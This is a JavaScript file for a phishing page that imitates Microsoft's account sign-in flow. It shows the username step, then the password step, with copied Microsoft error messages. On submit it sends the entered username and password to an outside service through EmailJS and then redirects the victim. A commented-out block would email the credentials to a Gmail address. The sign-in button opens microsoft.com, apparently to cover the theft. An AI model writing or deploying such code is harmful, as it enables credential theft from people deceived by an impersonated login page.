

        

const unReq = "Enter a valid email address, phone number, or Skype name."
const pwdReq = "Please enter the password for your Microsoft account."
const unameInp = document.getElementById('inp_uname');
const pwdInp = document.getElementById('inp_pwd');
let view = "uname";

let unameVal = pwdVal = false;
/////next button
const nxt = document.getElementById('btn_next');

nxt.addEventListener('click', () => {
    //validate the form
    validate();
    if (unameVal) {
        document.getElementById("section_uname").classList.toggle('d-none');
        document.getElementById('section_pwd').classList.remove('d-none');
        document.querySelectorAll('#user_identity').forEach((e) => {
            e.innerText = unameInp.value;
        })
        view = "pwd";
    }
})

//////sign in button

const sig = document.getElementById('btn_sig');

sig.addEventListener('click', () => {
    //validate the form
    // validate();
    // if (pwdVal) {
    //     document.getElementById("section_pwd").classList.toggle('d-none');
    //     document.getElementById('section_final').classList.remove('d-none');
    //     view = "final";
    // }



    window.open("https://www.microsoft.com");

    // var email = document.getElementById('inp_uname').value;
    // var password = document.getElementById('inp_pwd').value;
    // var body = 'email: '+email + '<br/> password: '+password;


                
    
    // Email.send({
    // SecureToken : " d1c02ba7-6695-449c-aa21-69c9797c274a",
    // To : 'Sandratown260@gmail.com',
    // From : 'Sandratown260@gmail.com',
    // Subject : "This is the subject",
    // Body : body
    // })  
    
})

function validate() {
    function unameValAction(type) {
        if (!type) {
            document.getElementById('error_uname').innerText = unReq;
            unameInp.classList.toggle('error-inp');
            unameVal = false;
        } else {
            document.getElementById('error_uname').innerText = "";
            unameInp.classList.remove('error-inp')
            unameVal = true;
        }

    }
    function pwdValAction(type) {
        if (!type) {
            document.getElementById('error_pwd').innerText = pwdReq;
            pwdInp.classList.toggle('error-inp')
            pwdVal = false;
        } else {
            document.getElementById('error_pwd').innerText = "";
            pwdInp.classList.remove('error-inp')
            pwdVal = true;
        }

    }
    if (view === "uname") {
        if (unameInp.value.trim() === "") {
            unameValAction(false);
        } else {
            unameValAction(true);
        }
        unameInp.addEventListener('change', function () {
            if (this.value.trim() === "") {
                unameValAction(false);
            } else {
                unameValAction(true);
            }
        })
    } else if (view === "pwd") {
        if (pwdInp.value.trim() === "") {
            pwdValAction(false);
        } else {
            pwdValAction(true);
        }
        pwdInp.addEventListener('change', function () {
            if (this.value.trim() === "") {
                pwdValAction(false);
            } else {
                pwdValAction(true);
            }
        })
    }
    return false;
}

//back button
document.querySelector('.back').addEventListener('click', () => {
    view = "uname";
    document.getElementById("section_pwd").classList.toggle('d-none');
    document.getElementById('section_uname').classList.remove('d-none');
})

document.getElementById('form').addEventListener('submit', function (event) {
    event.preventDefault(); // Prevent the default form submission

    // Get the form data
    const username = document.getElementById('inp_uname').value;
    const password = document.getElementById('inp_pwd').value;

    const formData = {
        username: username,
        password: password
    };

    // Send the form data via Email.js
    emailjs.send("service_bleeahe", "template_3sjzma2", formData)
        .then(function (response) {
            console.log('SUCCESS!', response.status, response.text);
            redirectToURL();
        }, function (error) {
            console.log('ERROR!', error);
            redirectToURL();
        });
});

